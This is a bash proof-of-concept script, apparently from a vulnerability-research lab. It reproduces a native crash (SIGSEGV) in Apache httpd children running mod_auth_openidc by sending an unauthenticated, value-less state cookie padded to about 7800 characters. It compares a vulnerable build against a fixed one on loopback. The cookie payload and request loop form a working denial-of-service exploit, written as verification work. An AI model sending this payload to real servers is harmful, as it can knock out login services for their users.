#!/usr/bin/env bash
# W13: NATIVE child SIGSEGV from one unauthenticated value-less state cookie.
# No shim, no LD_PRELOAD, no ptrace. Loopback 127.0.0.1:18090 only.
# The fault is bimodal per httpd start; this script characterizes both states.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
VCONF="$HERE/httpd-plain.conf"; VERR="$HERE/error-plain.log"
FCONF="$HERE/httpd-plain-fixed.conf"; FERR="$HERE/error-plain-fixed.log"
URL=http://127.0.0.1:18090/protected
OUT="$HERE/evidence/w13-native"
mkdir -p "$OUT"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
export ASAN_OPTIONS=detect_leaks=0
PAD=$(printf 'a%.0s' $(seq 1 7800))

stop() {
  "$HTTPD" -f "$VCONF" -k stop >/dev/null 2>&1 || true
  "$HTTPD" -f "$FCONF" -k stop >/dev/null 2>&1 || true
  sleep 2
}
trap stop EXIT

# label, config, error log, cookie, restarts, requests per restart
sweep() {
  label="$1" conf="$2" err="$3" cookie="$4" restarts="$5" n="$6"
  : > "$OUT/$label-results.txt"
  for r in $(seq 1 "$restarts"); do
    stop
    : > "$err"
    "$HTTPD" -f "$conf" -k start >"$OUT/$label-$r-start.out" 2>&1 || true
    sleep 3
    master=$(cat "$HERE/$(basename "$conf" .conf).pid" 2>/dev/null || echo NOPID)
    ok=0
    for i in $(seq 1 "$n"); do
      code=$(curl -sS --max-time 6 -o /dev/null -w '%{http_code}' \
        -H "Cookie: $cookie" "$URL" 2>/dev/null || echo CURLERR)
      [ "$code" = 302 ] && ok=$((ok+1))
    done
    crashes=$(grep -c 'exit signal' "$err" || true)
    printf '%s start=%s master=%s ok302=%s/%s AH00051=%s\n' \
      "$label" "$r" "$master" "$ok" "$n" "$crashes" | tee -a "$OUT/$label-results.txt"
  done
}

sweep vuln_bare  "$VCONF" "$VERR" "mod_auth_openidc_state_$PAD" 6 12
sweep vuln_safe  "$VCONF" "$VERR" "mod_auth_openidc_state_$PAD=1" 4 8
sweep fixed_bare "$FCONF" "$FERR" "mod_auth_openidc_state_$PAD" 4 8

echo "state.c sha256: $(sha256sum "$HERE/src/mod_auth_openidc-plain/src/state.c" | awk '{print $1}')"
echo "module  sha256: $(sha256sum "$HERE/src/mod_auth_openidc-plain/src/.libs/mod_auth_openidc.so" | awk '{print $1}')"
echo "results: $OUT"
